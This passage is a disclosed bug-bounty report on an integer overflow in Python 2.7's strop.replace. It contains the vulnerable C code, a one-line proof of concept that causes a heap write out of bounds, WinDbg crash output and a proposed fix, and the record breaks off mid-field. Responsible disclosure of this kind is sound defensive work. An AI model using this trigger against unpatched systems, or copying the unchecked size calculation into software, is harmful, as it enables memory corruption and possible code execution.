{"id":129771,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjk3NzE=","url":"https://hackerone.com/reports/129771","title":"Python 2.7 strop.replace Integer Overflow","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-04-11T07:43:33.207Z","submitted_at":"2016-04-11T07:43:33.207Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"johnleitch","url":"/johnleitch","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":27,"url":"https://hackerone.com/ibb-python","handle":"ibb-python","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/027/c46b79d4c73a7b34d61a717ed19ae719a0b67b2e_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/027/c46b79d4c73a7b34d61a717ed19ae719a0b67b2e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Python (IBB)","twitter_handle":"","website":"http://www.python.org/news/security","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-05-02T05:21:33.907Z","bug_reporter_agreed_on_going_public_at":"2016-05-02T05:21:33.807Z","team_member_agreed_on_going_public_at":"2016-04-30T22:47:09.214Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I reported this via email a while ago, and I think it slipped through the cracks. This one's nice clean overflow in the strop module, which is deprecated but still available in Python 2.7 and in use.\n\nOriginal url: https://bugs.python.org/issue24708\n\n---\n\nThe Python strop.replace() method suffers from an integer overflow that can be exploited to write outside the bounds of the string buffer and potentially achieve code execution. The issue can be triggered by performing a large substitution that overflows the arithmetic used in mymemreplace() to calculate the size of the new string:\n\nstatic char *\nmymemreplace(const char *str, Py_ssize_t len,           /* input string */\n         const char *pat, Py_ssize_t pat_len,           /* pattern string to find */\n         const char *sub, Py_ssize_t sub_len,           /* substitution string */\n         Py_ssize_t count,                              /* number of replacements */\n         Py_ssize_t *out_len)\n{\n    [...]\n\n    new_len = len + nfound*(sub_len - pat_len); \u003c\u003c\u003c\u003c Unchecked arithmetic can overflow here.\n    if (new_len == 0) {\n        /* Have to allocate something for the caller to free(). */\n        out_s = (char *)PyMem_MALLOC(1);\n        if (out_s == NULL)\n            return NULL;\n        out_s[0] = '\\0';\n    }\n    else {\n        assert(new_len \u003e 0);\n        new_s = (char *)PyMem_MALLOC(new_len); \u003c\u003c\u003c\u003c An allocation is performed using overflowed value.\n        if (new_s == NULL)\n            return NULL;\n        out_s = new_s;\n\n        for (; count \u003e 0 \u0026\u0026 len \u003e 0; --count) { \u003c\u003c\u003c\u003c Memory is copied to new_s using len, which can be greater than the overflowed new_len value.\n            /* find index of next instance of pattern */\n            offset = mymemfind(str, len, pat, pat_len);\n            if (offset == -1)\n                break;\n\n            /* copy non matching part of input string */\n            memcpy(new_s, str, offset);\n            str += offset + pat_len;\n            len -= offset + pat_len;\n\n            /* copy substitute into the output string */\n            new_s += offset;\n            memcpy(new_s, sub, sub_len);\n            new_s += sub_len;\n        }\n        /* copy any remaining values into output string */\n        if (len \u003e 0)\n            memcpy(new_s, str, len);\n    }\n    [...]\n}\n\nThe following script demonstrates the issue:\n\nimport strop\nstrop.replace(\"\\x75\"*0xEAAA,\"\\x75\",\"AA\"*0xAAAA)\n\nWhen run under a debugger, it produces the following exception:\n\n0:000\u003e r\neax=01e4cfd0 ebx=5708fc94 ecx=00003c7a edx=00000000 esi=01e3dde8 edi=57096000\neip=7026ae7a esp=0027fc98 ebp=0027fca0 iopl=0         nv up ei pl nz ac pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216\nMSVCR90!memcpy+0x5a:\n7026ae7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\n0:000\u003e db edi-0x10\n57095ff0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n57096000  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n57096010  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n57096020  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n57096030  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n57096040  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n57096050  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n57096060  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\n0:000\u003e db esi\n01e3dde8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n01e3ddf8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n01e3de08  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n01e3de18  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n01e3de28  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n01e3de38  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n01e3de48  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n01e3de58  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\n0:000\u003e k\nChildEBP RetAddr  \n0027fca0 1e056efc MSVCR90!memcpy+0x5a [f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm @ 188]\n0027fcd0 1e05700b python27!mymemreplace+0xfc [c:\\build27\\cpython\\modules\\stropmodule.c @ 1139]\n0027fd18 1e0aaed7 python27!strop_replace+0xbb [c:\\build27\\cpython\\modules\\stropmodule.c @ 1185]\n0027fd30 1e0edcc0 python27!PyCFunction_Call+0x47 [c:\\build27\\cpython\\objects\\methodobject.c @ 81]\n0027fd5c 1e0f012a python27!call_function+0x2b0 [c:\\build27\\cpython\\python\\ceval.c @ 4035]\n0027fdcc 1e0f1100 python27!PyEval_EvalFrameEx+0x239a [c:\\build27\\cpython\\python\\ceval.c @ 2684]\n0027fe00 1e0f1162 python27!PyEval_EvalCodeEx+0x690 [c:\\build27\\cpython\\python\\ceval.c @ 3267]\n0027fe2c 1e1170ca python27!PyEval_EvalCode+0x22 [c:\\build27\\cpython\\python\\ceval.c @ 674]\n0027fe44 1e118215 python27!run_mod+0x2a [c:\\build27\\cpython\\python\\pythonrun.c @ 1371]\n0027fe64 1e1187b0 python27!PyRun_FileExFlags+0x75 [c:\\build27\\cpython\\python\\pythonrun.c @ 1358]\n0027fea4 1e119129 python27!PyRun_SimpleFileExFlags+0x190 [c:\\build27\\cpython\\python\\pythonrun.c @ 950]\n0027fec0 1e038cb5 python27!PyRun_AnyFileExFlags+0x59 [c:\\build27\\cpython\\python\\pythonrun.c @ 753]\n0027ff3c 1d00116d python27!Py_Main+0x965 [c:\\build27\\cpython\\modules\\main.c @ 643]\n0027ff80 74b97c04 python!__tmainCRTStartup+0x10f [f:\\dd\\vctools\\crt_bld\\self_x86\\crt\\src\\crtexe.c @ 586]\n0027ff94 7701ad1f KERNEL32!BaseThreadInitThunk+0x24\n0027ffdc 7701acea ntdll!__RtlUserThreadStart+0x2f\n0027ffec 00000000 ntdll!_RtlUserThreadStart+0x1b\n0:000\u003e !analyze -v -nodb\n*******************************************************************************\n*                                                                             *\n*                        Exception Analysis                                   *\n*                                                                             *\n*******************************************************************************\n\n\nFAULTING_IP: \nMSVCR90!memcpy+5a [f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm @ 188]\n7026ae7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\n\nEXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)\nExceptionAddress: 7026ae7a (MSVCR90!memcpy+0x0000005a)\n   ExceptionCode: c0000005 (Access violation)\n  ExceptionFlags: 00000000\nNumberParameters: 2\n   Parameter[0]: 00000001\n   Parameter[1]: 57096000\nAttempt to write to address 57096000\n\nCONTEXT:  00000000 -- (.cxr 0x0;r)\neax=01e4cfd0 ebx=5708fc94 ecx=00003c7a edx=00000000 esi=01e3dde8 edi=57096000\neip=7026ae7a esp=0027fc98 ebp=0027fca0 iopl=0         nv up ei pl nz ac pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216\nMSVCR90!memcpy+0x5a:\n7026ae7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\n\nFAULTING_THREAD:  00001408\n\nPROCESS_NAME:  python.exe\n\nERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.\n\nEXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.\n\nEXCEPTION_PARAMETER1:  00000001\n\nEXCEPTION_PARAMETER2:  57096000\n\nWRITE_ADDRESS:  57096000 \n\nFOLLOWUP_IP: \nMSVCR90!memcpy+5a [f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm @ 188]\n7026ae7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\n\nNTGLOBALFLAG:  470\n\nAPPLICATION_VERIFIER_FLAGS:  0\n\nAPP:  python.exe\n\nANALYSIS_VERSION: 6.3.9600.17029 (debuggers(dbg).140219-1702) x86fre\n\nBUGCHECK_STR:  APPLICATION_FAULT_STRING_DEREFERENCE_INVALID_POINTER_WRITE_FILL_PATTERN_NXCODE\n\nPRIMARY_PROBLEM_CLASS:  STRING_DEREFERENCE_FILL_PATTERN_NXCODE\n\nDEFAULT_BUCKET_ID:  STRING_DEREFERENCE_FILL_PATTERN_NXCODE\n\nLAST_CONTROL_TRANSFER:  from 1e056efc to 7026ae7a\n\nSTACK_TEXT:  \n0027fca0 1e056efc 5708fc94 01e37a7c 00015554 MSVCR90!memcpy+0x5a\n0027fcd0 1e05700b 01e2ba4e 38e171c8 01d244cc python27!mymemreplace+0xfc\n0027fd18 1e0aaed7 00000000 01cebe40 01de2c38 python27!strop_replace+0xbb\n0027fd30 1e0edcc0 01de2c38 01cebe40 00000000 python27!PyCFunction_Call+0x47\n0027fd5c 1e0f012a 0027fdb4 01ce6c80 01ce6c80 python27!call_function+0x2b0\n0027fdcc 1e0f1100 01ddd9d0 00000000 01ce6c80 python27!PyEval_EvalFrameEx+0x239a\n0027fe00 1e0f1162 01ce6c80 01ddd9d0 01ceaa50 python27!PyEval_EvalCodeEx+0x690\n0027fe2c 1e1170ca 01ce6c80 01ceaa50 01ceaa50 python27!PyEval_EvalCode+0x22\n0027fe44 1e118215 01dca090 01ceaa50 01ceaa50 python27!run_mod+0x2a\n0027fe64 1e1187b0 702c7408 00342ebb 00000101 python27!PyRun_FileExFlags+0x75\n0027fea4 1e119129 702c7408 00342ebb 00000001 python27!PyRun_SimpleFileExFlags+0x190\n0027fec0 1e038cb5 702c7408 00342ebb 00000001 python27!PyRun_AnyFileExFlags+0x59\n0027ff3c 1d00116d 00000002 00342e98 00341950 python27!Py_Main+0x965\n0027ff80 74b97c04 7ffde000 74b97be0 b4e726fd python!__tmainCRTStartup+0x10f\n0027ff94 7701ad1f 7ffde000 b723218a 00000000 KERNEL32!BaseThreadInitThunk+0x24\n0027ffdc 7701acea ffffffff 77000212 00000000 ntdll!__RtlUserThreadStart+0x2f\n0027ffec 00000000 1d001314 7ffde000 00000000 ntdll!_RtlUserThreadStart+0x1b\n\n\nSTACK_COMMAND:  .cxr 0x0 ; kb\n\nFAULTING_SOURCE_LINE:  f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm\n\nFAULTING_SOURCE_FILE:  f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm\n\nFAULTING_SOURCE_LINE_NUMBER:  188\n\nFAULTING_SOURCE_CODE:  \nNo source found for 'f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm'\n\n\nSYMBOL_STACK_INDEX:  0\n\nSYMBOL_NAME:  msvcr90!memcpy+5a\n\nFOLLOWUP_NAME:  MachineOwner\n\nMODULE_NAME: MSVCR90\n\nIMAGE_NAME:  MSVCR90.dll\n\nDEBUG_FLR_IMAGE_TIMESTAMP:  51ea24a5\n\nFAILURE_BUCKET_ID:  STRING_DEREFERENCE_FILL_PATTERN_NXCODE_c0000005_MSVCR90.dll!memcpy\n\nBUCKET_ID:  APPLICATION_FAULT_STRING_DEREFERENCE_INVALID_POINTER_WRITE_FILL_PATTERN_NXCODE_msvcr90!memcpy+5a\n\nANALYSIS_SOURCE:  UM\n\nFAILURE_ID_HASH_STRING:  um:string_dereference_fill_pattern_nxcode_c0000005_msvcr90.dll!memcpy\n\nFAILURE_ID_HASH:  {031149d8-0626-9042-d8b7-a1766b1c5514}\n\nFollowup: MachineOwner\n---------\n\nTo fix the issue, mymemreplace should validate that the computed value new_len has not overflowed. To do this, (new_len - len) / nfound should be compared to sub_len - pat_len. If that are not equal, an overflow has occurred. Proposed patches for stropmodule.c and test_strop.py are attached.","vulnerability_information_html":"\u003cp\u003eI reported this via email a while ago, and I think it slipped through the cracks. This one\u0026#39;s nice clean overflow in the strop module, which is deprecated but still available in Python 2.7 and in use.\u003c/p\u003e\n\n\u003cp\u003eOriginal url: \u003ca title=\"https://bugs.python.org/issue24708\" href=\"/redirect?url=https%3A%2F%2Fbugs.python.org%2Fissue24708\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.python.org/issue24708\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eThe Python strop.replace() method suffers from an integer overflow that can be exploited to write outside the bounds of the string buffer and potentially achieve code execution. The issue can be triggered by performing a large substitution that overflows the arithmetic used in mymemreplace() to calculate the size of the new string:\u003c/p\u003e\n\n\u003cp\u003estatic char *\u003cbr\u003e\nmymemreplace(const char \u003cem\u003estr, Py_ssize_t len,           /\u003c/em\u003e input string \u003cem\u003e/\u003cbr\u003e\n         const char *pat, Py_ssize_t pat_len,           /\u003c/em\u003e pattern string to find \u003cem\u003e/\u003cbr\u003e\n         const char *sub, Py_ssize_t sub_len,           /\u003c/em\u003e substitution string \u003cem\u003e/\u003cbr\u003e\n         Py_ssize_t count,                              /\u003c/em\u003e number of replacements */\u003cbr\u003e\n         Py_ssize_t *out_len)\u003cbr\u003e\n{\u003cbr\u003e\n    [...]\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003enew_len = len + nfound*(sub_len - pat_len); \u0026lt;\u0026lt;\u0026lt;\u0026lt; Unchecked arithmetic can overflow here.\nif (new_len == 0) {\n    /* Have to allocate something for the caller to free(). */\n    out_s = (char *)PyMem_MALLOC(1);\n    if (out_s == NULL)\n        return NULL;\n    out_s[0] = \u0026#39;\\0\u0026#39;;\n}\nelse {\n    assert(new_len \u0026gt; 0);\n    new_s = (char *)PyMem_MALLOC(new_len); \u0026lt;\u0026lt;\u0026lt;\u0026lt; An allocation is performed using overflowed value.\n    if (new_s == NULL)\n        return NULL;\n    out_s = new_s;\n\n    for (; count \u0026gt; 0 \u0026amp;\u0026amp; len \u0026gt; 0; --count) { \u0026lt;\u0026lt;\u0026lt;\u0026lt; Memory is copied to new_s using len, which can be greater than the overflowed new_len value.\n        /* find index of next instance of pattern */\n        offset = mymemfind(str, len, pat, pat_len);\n        if (offset == -1)\n            break;\n\n        /* copy non matching part of input string */\n        memcpy(new_s, str, offset);\n        str += offset + pat_len;\n        len -= offset + pat_len;\n\n        /* copy substitute into the output string */\n        new_s += offset;\n        memcpy(new_s, sub, sub_len);\n        new_s += sub_len;\n    }\n    /* copy any remaining values into output string */\n    if (len \u0026gt; 0)\n        memcpy(new_s, str, len);\n}\n[...]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e}\u003c/p\u003e\n\n\u003cp\u003eThe following script demonstrates the issue:\u003c/p\u003e\n\n\u003cp\u003eimport strop\u003cbr\u003e\nstrop.replace(\u0026quot;\\x75\u0026quot;*0xEAAA,\u0026quot;\\x75\u0026quot;,\u0026quot;AA\u0026quot;*0xAAAA)\u003c/p\u003e\n\n\u003cp\u003eWhen run under a debugger, it produces the following exception:\u003c/p\u003e\n\n\u003cp\u003e0:000\u0026gt; r\u003cbr\u003e\neax=01e4cfd0 ebx=5708fc94 ecx=00003c7a edx=00000000 esi=01e3dde8 edi=57096000\u003cbr\u003e\neip=7026ae7a esp=0027fc98 ebp=0027fca0 iopl=0         nv up ei pl nz ac pe nc\u003cbr\u003e\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216\u003cbr\u003e\nMSVCR90!memcpy+0x5a:\u003cbr\u003e\n7026ae7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\u003cbr\u003e\n0:000\u0026gt; db edi-0x10\u003cbr\u003e\n57095ff0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\u003cbr\u003e\n57096000  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\u003cbr\u003e\n57096010  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\u003cbr\u003e\n57096020  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\u003cbr\u003e\n57096030  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\u003cbr\u003e\n57096040  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\u003cbr\u003e\n57096050  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\u003cbr\u003e\n57096060  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????\u003cbr\u003e\n0:000\u0026gt; db esi\u003cbr\u003e\n01e3dde8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\u003cbr\u003e\n01e3ddf8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\u003cbr\u003e\n01e3de08  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\u003cbr\u003e\n01e3de18  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\u003cbr\u003e\n01e3de28  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\u003cbr\u003e\n01e3de38  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\u003cbr\u003e\n01e3de48  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\u003cbr\u003e\n01e3de58  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA\u003cbr\u003e\n0:000\u0026gt; k\u003cbr\u003e\nChildEBP RetAddr\u003cbr\u003e\u003cbr\u003e\n0027fca0 1e056efc MSVCR90!memcpy+0x5a [f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm @ 188]\u003cbr\u003e\n0027fcd0 1e05700b python27!mymemreplace+0xfc [c:\\build27\\cpython\\modules\\stropmodule.c @ 1139]\u003cbr\u003e\n0027fd18 1e0aaed7 python27!strop_replace+0xbb [c:\\build27\\cpython\\modules\\stropmodule.c @ 1185]\u003cbr\u003e\n0027fd30 1e0edcc0 python27!PyCFunction_Call+0x47 [c:\\build27\\cpython\\objects\\methodobject.c @ 81]\u003cbr\u003e\n0027fd5c 1e0f012a python27!call_function+0x2b0 [c:\\build27\\cpython\\python\\ceval.c @ 4035]\u003cbr\u003e\n0027fdcc 1e0f1100 python27!PyEval_EvalFrameEx+0x239a [c:\\build27\\cpython\\python\\ceval.c @ 2684]\u003cbr\u003e\n0027fe00 1e0f1162 python27!PyEval_EvalCodeEx+0x690 [c:\\build27\\cpython\\python\\ceval.c @ 3267]\u003cbr\u003e\n0027fe2c 1e1170ca python27!PyEval_EvalCode+0x22 [c:\\build27\\cpython\\python\\ceval.c @ 674]\u003cbr\u003e\n0027fe44 1e118215 python27!run_mod+0x2a [c:\\build27\\cpython\\python\\pythonrun.c @ 1371]\u003cbr\u003e\n0027fe64 1e1187b0 python27!PyRun_FileExFlags+0x75 [c:\\build27\\cpython\\python\\pythonrun.c @ 1358]\u003cbr\u003e\n0027fea4 1e119129 python27!PyRun_SimpleFileExFlags+0x190 [c:\\build27\\cpython\\python\\pythonrun.c @ 950]\u003cbr\u003e\n0027fec0 1e038cb5 python27!PyRun_AnyFileExFlags+0x59 [c:\\build27\\cpython\\python\\pythonrun.c @ 753]\u003cbr\u003e\n0027ff3c 1d00116d python27!Py_Main+0x965 [c:\\build27\\cpython\\modules\\main.c @ 643]\u003cbr\u003e\n0027ff80 74b97c04 python!\u003cstrong\u003etmainCRTStartup+0x10f [f:\\dd\\vctools\\crt_bld\\self_x86\\crt\\src\\crtexe.c @ 586]\u003cbr\u003e\n0027ff94 7701ad1f KERNEL32!BaseThreadInitThunk+0x24\u003cbr\u003e\n0027ffdc 7701acea ntdll!\u003c/strong\u003eRtlUserThreadStart+0x2f\u003cbr\u003e\n0027ffec 00000000 ntdll!_RtlUserThreadStart+0x1b\u003cbr\u003e\n0:000\u0026gt; !analyze -v -nodb\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cul\u003e\n\u003cli\u003e                                                                            *\u003c/li\u003e\n\u003cli\u003e                       Exception Analysis                                   *\u003c/li\u003e\n\u003cli\u003e                                                                            *\n*******************************************************************************\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eFAULTING_IP: \u003cbr\u003e\nMSVCR90!memcpy+5a [f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm @ 188]\u003cbr\u003e\n7026ae7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\u003c/p\u003e\n\n\u003cp\u003eEXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)\u003cbr\u003e\nExceptionAddress: 7026ae7a (MSVCR90!memcpy+0x0000005a)\u003cbr\u003e\n   ExceptionCode: c0000005 (Access violation)\u003cbr\u003e\n  ExceptionFlags: 00000000\u003cbr\u003e\nNumberParameters: 2\u003cbr\u003e\n   Parameter[0]: 00000001\u003cbr\u003e\n   Parameter[1]: 57096000\u003cbr\u003e\nAttempt to write to address 57096000\u003c/p\u003e\n\n\u003cp\u003eCONTEXT:  00000000 -- (.cxr 0x0;r)\u003cbr\u003e\neax=01e4cfd0 ebx=5708fc94 ecx=00003c7a edx=00000000 esi=01e3dde8 edi=57096000\u003cbr\u003e\neip=7026ae7a esp=0027fc98 ebp=0027fca0 iopl=0         nv up ei pl nz ac pe nc\u003cbr\u003e\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216\u003cbr\u003e\nMSVCR90!memcpy+0x5a:\u003cbr\u003e\n7026ae7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\u003c/p\u003e\n\n\u003cp\u003eFAULTING_THREAD:  00001408\u003c/p\u003e\n\n\u003cp\u003ePROCESS_NAME:  python.exe\u003c/p\u003e\n\n\u003cp\u003eERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.\u003c/p\u003e\n\n\u003cp\u003eEXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.\u003c/p\u003e\n\n\u003cp\u003eEXCEPTION_PARAMETER1:  00000001\u003c/p\u003e\n\n\u003cp\u003eEXCEPTION_PARAMETER2:  57096000\u003c/p\u003e\n\n\u003cp\u003eWRITE_ADDRESS:  57096000 \u003c/p\u003e\n\n\u003cp\u003eFOLLOWUP_IP: \u003cbr\u003e\nMSVCR90!memcpy+5a [f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm @ 188]\u003cbr\u003e\n7026ae7a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\u003c/p\u003e\n\n\u003cp\u003eNTGLOBALFLAG:  470\u003c/p\u003e\n\n\u003cp\u003eAPPLICATION_VERIFIER_FLAGS:  0\u003c/p\u003e\n\n\u003cp\u003eAPP:  python.exe\u003c/p\u003e\n\n\u003cp\u003eANALYSIS_VERSION: 6.3.9600.17029 (debuggers(dbg).140219-1702) x86fre\u003c/p\u003e\n\n\u003cp\u003eBUGCHECK_STR:  APPLICATION_FAULT_STRING_DEREFERENCE_INVALID_POINTER_WRITE_FILL_PATTERN_NXCODE\u003c/p\u003e\n\n\u003cp\u003ePRIMARY_PROBLEM_CLASS:  STRING_DEREFERENCE_FILL_PATTERN_NXCODE\u003c/p\u003e\n\n\u003cp\u003eDEFAULT_BUCKET_ID:  STRING_DEREFERENCE_FILL_PATTERN_NXCODE\u003c/p\u003e\n\n\u003cp\u003eLAST_CONTROL_TRANSFER:  from 1e056efc to 7026ae7a\u003c/p\u003e\n\n\u003cp\u003eSTACK_TEXT:\u003cbr\u003e\u003cbr\u003e\n0027fca0 1e056efc 5708fc94 01e37a7c 00015554 MSVCR90!memcpy+0x5a\u003cbr\u003e\n0027fcd0 1e05700b 01e2ba4e 38e171c8 01d244cc python27!mymemreplace+0xfc\u003cbr\u003e\n0027fd18 1e0aaed7 00000000 01cebe40 01de2c38 python27!strop_replace+0xbb\u003cbr\u003e\n0027fd30 1e0edcc0 01de2c38 01cebe40 00000000 python27!PyCFunction_Call+0x47\u003cbr\u003e\n0027fd5c 1e0f012a 0027fdb4 01ce6c80 01ce6c80 python27!call_function+0x2b0\u003cbr\u003e\n0027fdcc 1e0f1100 01ddd9d0 00000000 01ce6c80 python27!PyEval_EvalFrameEx+0x239a\u003cbr\u003e\n0027fe00 1e0f1162 01ce6c80 01ddd9d0 01ceaa50 python27!PyEval_EvalCodeEx+0x690\u003cbr\u003e\n0027fe2c 1e1170ca 01ce6c80 01ceaa50 01ceaa50 python27!PyEval_EvalCode+0x22\u003cbr\u003e\n0027fe44 1e118215 01dca090 01ceaa50 01ceaa50 python27!run_mod+0x2a\u003cbr\u003e\n0027fe64 1e1187b0 702c7408 00342ebb 00000101 python27!PyRun_FileExFlags+0x75\u003cbr\u003e\n0027fea4 1e119129 702c7408 00342ebb 00000001 python27!PyRun_SimpleFileExFlags+0x190\u003cbr\u003e\n0027fec0 1e038cb5 702c7408 00342ebb 00000001 python27!PyRun_AnyFileExFlags+0x59\u003cbr\u003e\n0027ff3c 1d00116d 00000002 00342e98 00341950 python27!Py_Main+0x965\u003cbr\u003e\n0027ff80 74b97c04 7ffde000 74b97be0 b4e726fd python!\u003cstrong\u003etmainCRTStartup+0x10f\u003cbr\u003e\n0027ff94 7701ad1f 7ffde000 b723218a 00000000 KERNEL32!BaseThreadInitThunk+0x24\u003cbr\u003e\n0027ffdc 7701acea ffffffff 77000212 00000000 ntdll!\u003c/strong\u003eRtlUserThreadStart+0x2f\u003cbr\u003e\n0027ffec 00000000 1d001314 7ffde000 00000000 ntdll!_RtlUserThreadStart+0x1b\u003c/p\u003e\n\n\u003cp\u003eSTACK_COMMAND:  .cxr 0x0 ; kb\u003c/p\u003e\n\n\u003cp\u003eFAULTING_SOURCE_LINE:  f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm\u003c/p\u003e\n\n\u003cp\u003eFAULTING_SOURCE_FILE:  f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm\u003c/p\u003e\n\n\u003cp\u003eFAULTING_SOURCE_LINE_NUMBER:  188\u003c/p\u003e\n\n\u003cp\u003eFAULTING_SOURCE_CODE:\u003cbr\u003e\u003cbr\u003e\nNo source found for \u0026#39;f:\\dd\\vctools\\crt_bld\\SELF_X86\\crt\\src\\INTEL\\memcpy.asm\u0026#39;\u003c/p\u003e\n\n\u003cp\u003eSYMBOL_STACK_INDEX:  0\u003c/p\u003e\n\n\u003cp\u003eSYMBOL_NAME:  msvcr90!memcpy+5a\u003c/p\u003e\n\n\u003cp\u003eFOLLOWUP_NAME:  MachineOwner\u003c/p\u003e\n\n\u003cp\u003eMODULE_NAME: 